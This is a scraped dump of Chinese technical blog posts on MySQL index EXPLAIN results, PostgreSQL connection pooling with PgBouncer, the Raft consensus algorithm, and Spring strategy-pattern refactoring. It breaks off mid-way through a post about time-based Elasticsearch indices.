+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | 1 | SIMPLE | student | NULL | ALL | NULL | NULL | NULL | NULL | 298708 | 10.00 | Using where | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select email, `level` from student where `level` = 59; +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | 1 | SIMPLE | student | NULL | ALL | NULL | NULL | NULL | NULL | 298708 | 10.00 | Using where | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where email = \u0026#39;sharryms@edublogs.org\u0026#39; and `level` = 59; +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | 1 | SIMPLE | student | NULL | ALL | NULL | NULL | NULL | NULL | 298708 | 1.00 | Using where | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ 1 row in set, 1 warning (0.01 sec) mysql\u0026gt; explain select * from student where `level` = 59 and email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ | 1 | SIMPLE | student | NULL | ALL | NULL | NULL | NULL | NULL | 298708 | 1.00 | Using where | +----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+ 1 row in set, 1 warning (0.00 sec) 当表 student 的二级索引只有 (email) 和 (level)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 mysql\u0026gt; show index from student; +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression | +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | student | 0 | PRIMARY | 1 | id | A | 204700 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | email_k | 1 | email | A | 204700 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | level_k | 1 | level | A | 101 | NULL | NULL | | BTREE | | | YES | NULL | +---------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ 3 rows in set (0.00 sec) mysql\u0026gt; explain select email, `level` from student where email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_k | email_k | 202 | const | 1 | 100.00 | NULL | +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select email, `level` from student where `level` = 59; +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | level_k | level_k | 4 | const | 2936 | 100.00 | NULL | +----+-------------+---------+------------+------+---------------+---------+---------+-------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where email = \u0026#39;sharryms@edublogs.org\u0026#39; and `level` = 59; +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ | 1 | SIMPLE | student | NULL | ref | email_k,level_k | email_k | 202 | const | 1 | 5.00 | Using where | +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where `level` = 59 and email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ | 1 | SIMPLE | student | NULL | ref | email_k,level_k | email_k | 202 | const | 1 | 5.00 | Using where | +----+-------------+---------+------------+------+-----------------+---------+---------+-------+------+----------+-------------+ 1 row in set, 1 warning (0.00 sec) 当表 student 的二级索引只有 (email, level)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 mysql\u0026gt; show index from student; +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression | +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | student | 0 | PRIMARY | 1 | id | A | 204700 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | email_level_k | 1 | email | A | 298708 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | email_level_k | 2 | level | A | 298708 | NULL | NULL | | BTREE | | | YES | NULL | +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ 3 rows in set (0.00 sec) mysql\u0026gt; explain select email, `level` from student where email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ | 1 | SIMPLE | student | NULL | ref | email_level_k | email_level_k | 202 | const | 1 | 100.00 | Using index | +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ 1 row in set, 1 warning (0.01 sec) mysql\u0026gt; explain select email, `level` from student where `level` = 59; +----+-------------+---------+------------+-------+---------------+---------------+---------+------+--------+----------+--------------------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+-------+---------------+---------------+---------+------+--------+----------+--------------------------+ | 1 | SIMPLE | student | NULL | index | email_level_k | email_level_k | 206 | NULL | 298708 | 10.00 | Using where; Using index | +----+-------------+---------+------------+-------+---------------+---------------+---------+------+--------+----------+--------------------------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where email = \u0026#39;sharryms@edublogs.org\u0026#39; and `level` = 59; +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_level_k | email_level_k | 206 | const,const | 1 | 100.00 | NULL | +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where `level` = 59 and email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_level_k | email_level_k | 206 | const,const | 1 | 100.00 | NULL | +----+-------------+---------+------------+------+---------------+---------------+---------+-------------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) 当表 student 的二级索引只有 (email, level) 和 (level)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 mysql\u0026gt; show index from student; +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression | +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ | student | 0 | PRIMARY | 1 | id | A | 204700 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | email_level_k | 1 | email | A | 298708 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | email_level_k | 2 | level | A | 298708 | NULL | NULL | | BTREE | | | YES | NULL | | student | 1 | level_k | 1 | level | A | 101 | NULL | NULL | | BTREE | | | YES | NULL | +---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+ 4 rows in set (0.00 sec) mysql\u0026gt; explain select email, `level` from student where email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ | 1 | SIMPLE | student | NULL | ref | email_level_k | email_level_k | 202 | const | 1 | 100.00 | Using index | +----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+ 1 row in set, 1 warning (0.02 sec) mysql\u0026gt; explain select email, `level` from student where `level` = 59; +----+-------------+---------+------------+------+-----------------------+---------+---------+-------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+-----------------------+---------+---------+-------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_level_k,level_k | level_k | 4 | const | 2936 | 100.00 | NULL | +----+-------------+---------+------------+------+-----------------------+---------+---------+-------+------+----------+-------+ 1 row in set, 1 warning (0.01 sec) mysql\u0026gt; explain select * from student where email = \u0026#39;sharryms@edublogs.org\u0026#39; and `level` = 59; +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_level_k,level_k | email_level_k | 206 | const,const | 1 | 100.00 | NULL | +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) mysql\u0026gt; explain select * from student where `level` = 59 and email = \u0026#39;sharryms@edublogs.org\u0026#39;; +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra | +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ | 1 | SIMPLE | student | NULL | ref | email_level_k,level_k | email_level_k | 206 | const,const | 1 | 100.00 | NULL | +----+-------------+---------+------------+------+-----------------------+---------------+---------+-------------+------+----------+-------+ 1 row in set, 1 warning (0.00 sec) 本文首发于 https://h2cone.github.io\n参考 How MySQL Uses Indexes\nDiagrams for InnoDB data structures and behaviors\n","date":"2022-03-15T15:48:42+08:00","permalink":"https://h2cone.github.io/2022/03/15/mysql-index/","title":"重新认识 MySQL（一）"},{"content":"前言 不久前参与了基于编排引擎的应用程序开发，在并发执行大量的短时任务时发现工作流当中任务之间的延迟可能远大于任务执行耗时。翻阅官方文档时发现此编排引擎以“数据库连接饥渴”著称，警告道：对于 MySQL 来说通常不是问题，因为它处理连接的模型是基于线程的，但这对于 PostgreSQL 可能是个问题，因为它的连接处理是基于进程的。\n曾经误以为编排引擎或数据库持有连接池，一方面由于对连接池的初印象来自于客户端 JDBC 连接池，另一方面是由于对于 MySQL 连接器的误解。\n将连接池加入到系统，随后测试发现并发执行任务的性能显著提高，很难不对连接池刮目相看。\n进程，还是线程 The Internals of PostgreSQL 展示了 PostgreSQL/Postgres 多进程架构：\n一个客户端（client）的连接请求由服务进程（server process）分派给一个后台进程（backend process）处理，后台进程从服务进程衍生（fork）而来。\n系统调用 fork 用于创建进程，此处引用 The fork() System Call 的图来简单认识一下：\n众所周知，创建进程的开销通常大于创建线程。Postgres 为什么使用多进程架构？在遥远的过去，线程模型在 Unix 上并不成熟，第一个 Postgres 开发者可能认为进程是比线程更安全、健壮、稳定的选择。\n进程之间的隔离性强于线程之间的隔离性，一个进程的崩溃通常不会影响其它进程。\n在现代操作系统上，创建进程与创建线程之间的开销差异比以前小得多。\n当事务非常短的时候，创建进程的成本是否真的可以忽略不计？What is the point of bouncing 的作者测量了建立连接的耗时：\n这意味着用“信任”连接到 localhost 平均需要 0.045ms，用 MD5 认证则需要 0.063ms。在网络上，它需要 0.532ms（信任）和 0.745ms（md5）。这听起来可能不多，但考虑到从相对较宽的表中获取单行（宽度，如解释所示：750 字节），使用主键需要 0.03ms，我们突然可以看到连接的开销比从磁盘获取数据要多 20 倍。\n连接池是否可以减少频繁创建进程的成本？Scaling PostgreSQL with PgBouncer: You May Need a Connection Pooler 的测试结果一目了然：\n上图是直连 Postgres 与使用 PgBouncer 作为连接池之间的 TPS 对比，并发数超过某一阈值之后，直连 Postgres 的性能大幅下降，而使用 PgBouncer 作为连接池非常稳定。\n集中，还是分散 连接池是维护数据库连接的缓存，以便将来的新请求可以重用连接。多路复用是线程池的核心方法之一，正常情况下，虚拟连接（virtual connection）数与物理连接（physical connection）数之比大于 1。\nPgBouncer 并非是客户端连接池，而是是集中式的连接池，处于客户端与数据库的中间层，实际上 PgBouncer 是单线程进程。把客户端与 PgBouncer 的连接称为客户端连接（client connection），再把 PgBouncer 与 Postgres 的连接称为服务端连接（server connection），从打开连接到关闭连接的过程看起来像这样子：\n客户端连接 PgBouncer，建立客户端连接（认证与授权）。\nPgBouncer 通过用户名与数据库名从池获取空闲的服务端连接（若没有则创建），随后将服务端连接分配给客户端连接。\n客户端连接与服务端连接配对完成之后，客户端间接连接了 Postgres（中间件代理）。\n客户端连接断开时，PgBouncer 不会关闭服务端连接，而是将服务端连接释放到池。\n在使用 PgBouncer 之前，我遇到的场景之一是每个客户端属于进程，几乎同时请求 Postgres，Postgres 创建大量后台进程，即使这些客户端运行时维护着各自的内嵌连接池，在过多客户端情况下，分散式比集中式池昂贵。分散式面向的是线程，而集中式面向的是进程，前者由于依赖库或框架，有一定的侵入性且无集中控制，后者增加了系统的复杂性，新增了一段延迟（经过中间层）、单点失效、可扩展性等问题。\nPgBouncer 配置 PgBouncer 有三种模式（pool_mode）指定服务端连接何时可以被其它客户端重用。\nsession。客户端断开连接后（关闭会话后），服务端连接被释放回池。\ntransaction。事务完成之后（回滚或者提交执行后），服务端连接被释放回池。不能保证在同一个客户端连接上运行的两个事务将在同一个服务端连接上运行。\nstatement。语句执行完成后，服务端连接被释放回池。在此模式下不允许多语句事务。\n由于那个编排引擎的所有工作进程依赖 SQLAlchemy 与 Postgres 通信，客户端连接有不容忽视的生命周期（pool_recycle），不止执行流程结点任务的子进程，其它子进程也需要持续保持连接从而做其它事情，所以最佳选择是 transaction。\n除了 pool_mode 以外，在性能调优时值得注意的配置项：\ndefault_pool_size。每对（用户名，数据库）允许多少个服务端连接。 max_client_conn。允许的最大客户端连接数。 详情请参考 PgBouncer Config。\n连接池与线程池 连接池不是、不属于线程池，两者职责分离。以 MySQL 为例，MySQL 客户端连接池虽然可以减少频繁建立或拆毁连接的开销，但是却对 MySQL 服务端的查询处理能力或负载一无所知；相比之下，MySQL 服务端线程池管理着接受入站并发连接和事务执行的一系列线程。\n旧文已介绍 Java 线程池，部分可类比，此处不再赘述。\n本文首发于 https://h2cone.github.io\n参考 Wiki # database connection\nPostgreSQL Connection Pooling: Part 1 – Pros \u0026amp; Cons\n为什么 MySQL 使用多线程，而 Oracle 和 PostgreSQL 使用多进程？\n线程崩溃是否会造成进程崩溃？\nPostgreSQL Connection Pooling: Part 2 – PgBouncer\nWhat is the purpose of session pool_mode in pgbouncer?\nManaging High Availability in PostgreSQL – Part III: Patroni\nPgbouncer最佳实践 之 性能提升篇\nA.15 MySQL 8.0 FAQ: MySQL Enterprise Thread Pool\nScaling the GitLab database\n","date":"2022-01-16T23:30:47+08:00","permalink":"https://h2cone.github.io/2022/01/16/connection-pool-0/","title":"连接池的意义"},{"content":"重要的事情 不是对论文的阅读理解，而是受到了动画的启发。\n启发式问题 共识是什么？共识算法的应用场景？\n共识是分布式系统最重要的抽象之一，著名的《Designing Data-Intensive Applications》展示了全景式的分布式系统，其中有一大章探讨一致性与共识的内容。\n共识问题通常形式化描述如下：一个或多个结点可以提议某些值，由共识算法来决定最终值。\n“通俗理解，共识是让几个结点就某项提议达成一致。例如，多个人同时尝试预订飞机的最后一个座位或剧院中的同一座位，或者尝试使用相同的用户名注册账户，此时可以用共识算法来决定这些不相容的操作之中谁是获胜者。”\n对于本地或共享内存的唯一性问题，直截了当的解决方案是使用锁，但到了分布式系统，复杂度骤然上升，共识可能是唯一可靠的方法。不止于此，共识算法可以应用于分布式系统的一系列问题：\n可线性化的比较－设置寄存器。寄存器需要根据当前值是否等于输入的参数，来自动决定接下来是否应该设置新值。\n原子事务提交。数据库需要决定是否提交或中止分布式事务。\n全序广播。消息系统要决定以何种顺序发送消息。\n锁与租约。当多个客户端争抢锁或租约时，要决定其中哪一个成功。\n成员/协调服务。对于失败检测器（例如超时机制），系统要决定结点的存活状态（例如基于会话超时）。\n唯一性约束。当多个事务在相同的主键上试图井发创建冲突资源时，约束条件要决定哪一个被允许，哪些违反约束因而必须失败。\nRaft 可能是最易于理解的共识算法，标杆式的实现是 etcd/raft，其它的实现可以在这里找到。\n为什么需要 Leader 或 Primary 或 Master 这类角色的选举？\n向客户端制造了单一服务端点的假象，客户端与系统的通信简化为与单一服务端的通信。\n有一种无主结点数据复制（leaderless replication）声称，如果 w + r \u0026gt; n，则读写的结点中一定包含最新值（n 是副本数，写入需要 w 个结点确认，读取必须至少查询 r 个结点）。如果写入了 w 个结点，则需要读取多于 n - w 个结点保证包含最新值（想象一下 w 个结点与 r 个结点有重叠），因此 r \u0026gt; n - w -\u0026gt; r + w \u0026gt; n，这被称为 Quorum，但现实情况往往更加复杂，不保证一定能读取到最新值。\n为单一 Leader 编写程序可能比采用 Quorum 等其它方法更容易，但是劣势也很明显，例如单点失效发生在唯一的 Leader 身上，那恢复期间服务不可用？客户端可以重试，直到一名新的 Leader 被选举出来；更严重的缺陷是唯一的 Leader 负载过高时，会成为了系统的性能瓶颈。早有耳闻 TiKV 是基于 Raft 的分布式键值对数据库，其扩展方式是通过数据分区与 Raft 组（raft group）。\n如上图所示，数据分布到 3 个分区（Region），每个分区通过 Raft 的数据复制方法得到 3 个数据副本（1 Leader + 2 follower），虽然 Raft 组之间并无一致性的要求，但是优势已经非常明显的了。\nFollower 何时转为 Candidate？Candidate 何时转为 Leader？Leader 何时转为 Follower？\nRaft 集群中的 Server 可以是 Leader，也可以是 Follower，还可以是选举中（Leader 不可用时）的 Candidate。Leader 负责将日志复制到 Followers（一种数据复制方法，名为状态机复制）。Leader 通过发送“心跳”定期通知 Follower 们它的存在。每个 Follower 都有一个倒计时（election timeout），接收到“心跳”时，将重置该倒计时，若没接收到，则转为 Candidate，开始 Leader 选举。\n每个 Server 的 Election timeout 不应是相等或者过于相近，否则容易出现多个 Candidate 同时请求投票的局面，很可能发生 Split vote。\n一旦获得了多数票，Candidate 就能提升为 Leader，所谓多数（majority）等于结点数量除以 2 的结果向下取整，比如 3 / 2 == 1、4 / 2 == 2、5 / 2 == 2。\n结点之间如何通信？允许 Candidates 并发请求投票（request votes）？结点如何响应？\n通常是 RPC，Server 可发送两类消息，一是 RequestVotes，二是 AppendEntries，分别用于 Leader 选举、心跳与日志复制。当然，但是每个 Server 在一个期数（term）最多只能投一票，Candidate 一定会投给自己一票，接收到投票请求的 Follower 最多回应一票。Term 是单调递增的整数变量，在开始 Leader 选举时递增，每个 Server 都维护着各自的 Term。\n一旦发生了 Split vote，由于多个 Candidate 都不能获得多数票（参考上图 4 结点的情景），只能递增 Term，开始新的选举。为了快速的选出 Leader 以提供服务，Election timeout 通常在 150 到 300 毫秒之间，最好运大于广播时间（向一组结点发送请求到接收响应的平均时间）且远小于 MTBF。\n如何解决脑裂？\n虽然某一任期最多只有一位 Leader，但是 Raft 集群可能因为网络分区，分裂成若干子集群。\n上文分析可以知道，少数派无法选举出新 Leader，只有多数派做得到。网络分区修复后，Term 较大的 Leader 会把 Term 较低 的 Leader 赶下台（discovers server with higher term）。\n为什么需要复制日志（replicated log）？\n日志是分布式系统最重要的抽象之一。写日志优先于执行来自客户端的命令，日志先行技术有不少优势，一是追加式更新较快，二是适合增量同步数据，三是满足数据恢复与强一致性要求。\n为什么 Leader 执行来自客户端的命令前先写日志？Leader/Follower 何时提交日志条目？又何时应用数据变更（执行命令）？\n假设不写日志或者先执行一系列命令，当某些命令执行失败了（没有真正持久化这件事客户端不一定知道），那相当于这些命令彻底丢失了；相反，先写日志后执行命令，至少可能发生一件命令已备份（日志条目包含命令）的事件，也就拥有了更强的容错性。值得一提的是，写日志当然也可能失败，退化成与执行来自客户端的命令一样，提示客户端失败或重试。\n如何保证结点之间复制日志的一致性？结点故障、网络分区、不一致时如何恢复？\n有些日志比另一些日志更新（more up-to-date）。Raft 通过比较最后一个日志条目来决定哪个 Server 的日志较新。\n最后一个日志条目的 term 不等时，term 越大则越新。\n最后一个日志条目的 term 相等时，日志越长则越新。\n对于 Server 之间的日志冲突，Raft 倾向于修复较旧的日志，使其与较新的日志保持一致。\n基于 Raft 的系统如何保证可靠性？换言之，如何容错（可用性与一致性）？例如结点故障、网络分区等。\n除了日志一致性、Raft 组、最佳的 Election timeout，如果 Follower 崩溃了，虽然其它 Server 发送消息给 Follower 失败了，但是 Server 会重试，直到 Follower 上线后回应确认消息；如果请求在失败之前已经被考虑，重启的 Follower 将忽略它。\n本文首发于 https://h2cone.github.io\n参考的链接 Raft Web Site\nTiKV # Multi-raft\n","date":"2021-10-17T19:00:17+08:00","permalink":"https://h2cone.github.io/2021/10/17/raft-0/","title":"浅谈 Raft"},{"content":"基于多态 假设有一段“分支代码”（片段 1）：\n1 2 3 4 5 6 7 8 9 // 可能的 Case CaseEnum caseEnum = getRandomCase(); if (CaseEnum.AA.equals(caseEnum)) { // ... } else if (CaseEnum.BB.equals(caseEnum)) { // ... } else if (CaseEnum.CC.equals(caseEnum)) { // ... } 其等效代码类似于（片段 2）：\n1 2 3 4 5 6 7 8 // 可能的 Case CaseEnum caseEnum = getRandomCase(); for (CaseHandler handler : caseHandlerFactory.getHandlers()) { if (handler.match(caseEnum)) { handler.handle(); break; } } 当增加分支的时候，片段 1 需要在尾部追加代码，而片段 2 无需变更，前提是片段 2 依赖更多的类。\n注意：片段 2 在最坏情况下的运行时间的增长数量级是 N。\n如何实现？\n（一）CaseHandler。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public interface CaseHandler { /** * 匹配 Case。 * * @param caseEnum Case 枚举 * @return 是否 */ boolean match(CaseEnum caseEnum); /** * 业务处理。 */ void handle(); } （二）CaseHandler 实现之一。\n1 2 3 4 5 6 7 8 9 10 11 12 public class AaHandler implements CaseHandler { @Override public boolean match(CaseEnum caseEnum) { return CaseEnum.AA.equals(caseEnum); } @Override public void handle() { // ... } } （三）CaseHandler 工厂。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class CaseHandlerFactory { /** * handler name to handler */ private final Map\u0026lt;String, CaseHandler\u0026gt; name2Handler; public CaseHandlerFactory() { this.name2Handler = new LinkedHashMap\u0026lt;\u0026gt;(); } public CaseHandlerFactory addHandler(CaseHandler handler) { if (Objects.isNull(handler)) { return this; } name2Handler.put(handler.getClass().getSimpleName(), handler); return this; } public Collection\u0026lt;CaseHandler\u0026gt; getHandlers() { return name2Handler.values(); } } （四）初始化 CaseHandler 工厂。\n1 2 3 4 5 final CaseHandlerFactory caseHandlerFactory = new CaseHandlerFactory() .addHandler(new AaHandler()) .addHandler(new BbHandler()) .addHandler(new CcHandler()) ; 依赖注入 基于 Spring IoC，自动实例化 CaseHandler 工厂。\n（一）将 CaseHandler 的所有实现声明为 Spring Bean。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @Component public class AaHandler implements CaseHandler { @Override public boolean match(CaseEnum caseEnum) { return CaseEnum.AA.equals(caseEnum); } @Override public void handle() { // ... } } （二）CaseHandlerFactory 构造器的依赖注入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Component public class CaseHandlerFactory { /** * handler name to handler */ private final Map\u0026lt;String, CaseHandler\u0026gt; name2Handler; @Autowired public CaseHandlerFactory(Collection\u0026lt;CaseHandler\u0026gt; handlers) { Assert.notNull(handlers, \u0026#34;handlers must not be null\u0026#34;); this.name2Handler = new LinkedHashMap\u0026lt;\u0026gt;(handlers.size()); handlers.forEach(this::addHandler); } public void addHandler(CaseHandler handler) { if (Objects.isNull(handler)) { return; } name2Handler.put(handler.getClass().getSimpleName(), handler); } public Collection\u0026lt;CaseHandler\u0026gt; getHandlers() { return name2Handler.values(); } } （三）引用 CaseHandlerFactory。\n1 2 @Resource private CaseHandlerFactory caseHandlerFactory; 策略模式 基于 Spring Boot 开发 Web 程序时，有时会遇到需要根据不同的类型或策略（strategy）做不同的事情，例如：\n1 2 3 4 5 6 7 8 9 10 11 12 @RestController @RequestMapping(\u0026#34;/some\u0026#34;) public class SomeController { @Resource private SomeService someService; @PostMapping(\u0026#34;/doSomething\u0026#34;) public ResponseEntity\u0026lt;?\u0026gt; doSomething(@RequestBody Some some) { someService.doSomething(some); return ResponseEntity.ok().build(); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Service public class SomeService { public void doSomething(Some some) { StrategyEnum strategyEnum = some.getStrategyEnum(); Assert.notNull(strategyEnum, \u0026#34;strategyEnum must not be null\u0026#34;); switch (strategyEnum) { case Strategy1: // ... break; case Strategy2: // ... break; case Strategy3: // ... break; default: // ... } } } 使用策略模式可以优化过长的“分支代码”。\nDefine a family of algorithms, encapsulate each one, and make them interchangeable. Strategy lets the algorithm vary independently from clients that use it.\n大同小异，编写策略类和策略工厂类。\n（一）所有可能的 Strategy。\n1 2 3 4 5 6 7 8 9 public enum StrategyEnum { Strategy1, Strategy2, Strategy3 // ... } （二）Strategy 接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface Strategy { /** * 获取 Strategy 枚举 * * @return Strategy 枚举 */ StrategyEnum getStrategyEnum(); /** * 业务处理 */ void doSomething(); } （三）Strategy 的其中一个实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @Component public class Strategy1 implements Strategy { @Override public StrategyEnum getStrategyEnum() { return StrategyEnum.Strategy1; } @Override public void doSomething() { // ... } } （四）Strategy 工厂。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Component public class StrategyFactory { private final Map\u0026lt;StrategyEnum, Strategy\u0026gt; strategyMap; @Autowired public StrategyFactory(Collection\u0026lt;Strategy\u0026gt; strategies) { Assert.notNull(strategies, \u0026#34;strategies must not be null\u0026#34;); this.strategyMap = new LinkedHashMap\u0026lt;\u0026gt;(strategies.size()); strategies.forEach((strategy) -\u0026gt; strategyMap.put(strategy.getStrategyEnum(), strategy)); } public Strategy getStrategy(StrategyEnum strategyEnum) { return strategyMap.get(strategyEnum); } } （五）重写 SomeService。\n1 2 3 4 5 6 7 8 9 10 11 12 @Service public class SomeService { @Resource private StrategyFactory strategyFactory; public void doSomething(Some some) { Strategy strategy = strategyFactory.getStrategy(some.getStrategyEnum()); if (Objects.nonNull(strategy)) { strategy.doSomething(); } } } 注意：获取策略的方法（getStrategy）在最坏情况下的运行时间的增长数量级是 1。\n本文首发于 https://h2cone.github.io\n参考资料 Spring Beans and Dependency Injection\nStrategy Design Pattern with in Spring Boot application.\n","date":"2021-08-05T14:37:16+08:00","permalink":"https://h2cone.github.io/2021/08/05/loop_or_strategy/","title":"优化过长的“分支代码”"},{"content":"基于日期的索引 预期单一索引增长速率较快，最终决定创建基于日期的索引（time-based indices），例如按月份分索引：\n1 2 3 4 @Document(indexName = \u0026#34;my_index-#{@timeBasedIndexNameProvider.toMonth()}\u0026#34;, shards = 3) public class Entity { // ... } 其中 indexName 的值可包含 SpEL，引用了 TimeBasedIndexNameProvider 的 toMonth。\n1 2 3 4 5 6 7 @Component(\u0026#34;timeBasedIndexNameProvider\u0026#34;) public class TimeBasedIndexNameProvider { public String toMonth() { return LocalDateTime.now().format(DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM\u0026#34;)); } } 生成的一系列索引名形式如下：\nmy_index-2021-07\nmy_index-2021-08\n\u0026hellip;\u0026hellip;\n保存实体时，当前月份的索引可能还未创建，如果直接使用 ElasticsearchRestTemplate 的 save 方法，当前版本并不会解析实体类的实例字段上标注的 Elasticsearch 